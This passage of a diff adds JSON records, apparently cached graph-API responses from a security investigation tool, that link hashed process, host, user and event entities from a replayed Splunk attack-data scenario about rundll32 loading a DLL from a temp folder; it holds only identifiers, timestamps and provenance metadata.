+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-4bdf30539cc8ed9f65e1a1aa0cb26d7afe4f5953a266d7f975d2ea23a4e08d37",
+            "label": "PROCESS_ON_HOST",
+            "kind": "event",
+            "from": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "to": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-e425e6a598d754125e97b0fa8b3e6775a7345050b5b58f0fd6406d38a3f5b1fa",
+            "label": "PARENT_OF",
+            "kind": "event",
+            "from": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "to": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-21899a05a0b6b23678fba60020129de8900a62bae140eacedc342d86e88cd30f",
+            "label": "PROCESS_ON_HOST",
+            "kind": "event",
+            "from": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "to": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-cc73f1fbc503a9dbc079cb2d7eda24474673a516e99644b69444d6844804164c",
+            "label": "PARENT_OF",
+            "kind": "event",
+            "from": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "to": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-92c9e8a5cc869612517a014c0a67be4943520b8e5cdeb54f2d3a9d97f080ab3b",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+            "to": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-84f72a6d368b792b2c652a9b7eab4385963a203ff4cf9437182992e36e74cd17",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+            "to": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-e8acb29c4a64835dea476f4fe10d477ecad96c4904051e0a32c85c941813d01f",
+            "label": "PROCESS_ON_HOST",
+            "kind": "event",
+            "from": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "to": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          }
+        ],
+        "historical_replay": true,
+        "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+        "source": {
+          "source_id": "splunk-attack-data",
+          "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+          "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+          "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+          "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+          "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+        },
+        "window": {
+          "start": "",
+          "end": "",
+          "bucket_minutes": 0
+        },
+        "selected": [
+          "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e"
+        ],
+        "shared": [],
+        "depth": 1,
+        "scope": "all",
+        "focus": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e"
+      }
+    },
+    "graph-process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085": {
+      "path": "/api/cyber/graph/node?id=process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+      "status": 200,
+      "sha256": "9dfa7cef7ac3abbdc006af8ccfda1789ea22f445956ddcdc1bbdab9963ff7f4d",
+      "bytes": 15190,
+      "seconds": 2.006490968,
+      "retrieved_at": "2026-09-21T10:26:18.604280+00:00",
+      "body": {
+        "nodes": [
+          {
+            "id": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+            "label": "Event",
+            "name": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "label": "Host",
+            "name": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "label": "Identity",
+            "name": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "label": "Process",
+            "name": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "observation_roles": [
+                "process_creation"
+              ],
+              "process_guid": "e4b49a97-9768-6888-5f01-00000000f103",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "label": "Process",
+            "name": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "observation_roles": [
+                "parent_field_reference"
+              ],
+              "process_guid": "e4b49a97-9749-6888-5a01-00000000f103",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          }
+        ],
+        "edges": [
+          {
+            "id": "edge-b9a04ef6c97813a59750119d7672f61457ddb450ff3cc58c4e7312148dcba394",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+            "to": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-ef524b676434ba0cd6e6637efa43183900494d522e37bcf0ce5f392e7a42f525",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+            "to": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-40238d364e99eaabd4674aa8cb9e7c956d3c51c648b529e71a0da13b5ae9c121",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+            "to": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-4bdf30539cc8ed9f65e1a1aa0cb26d7afe4f5953a266d7f975d2ea23a4e08d37",
+            "label": "PROCESS_ON_HOST",
+            "kind": "event",
+            "from": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "to": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-f6c57683a7f0afe2d06b7cc8e81465e5d548775f5a656e6b9078642d7620fb73",
+            "label": "EXECUTED_AS",
+            "kind": "event",
+            "from": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "to": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-e425e6a598d754125e97b0fa8b3e6775a7345050b5b58f0fd6406d38a3f5b1fa",
+            "label": "PARENT_OF",
+            "kind": "event",
+            "from": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "to": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
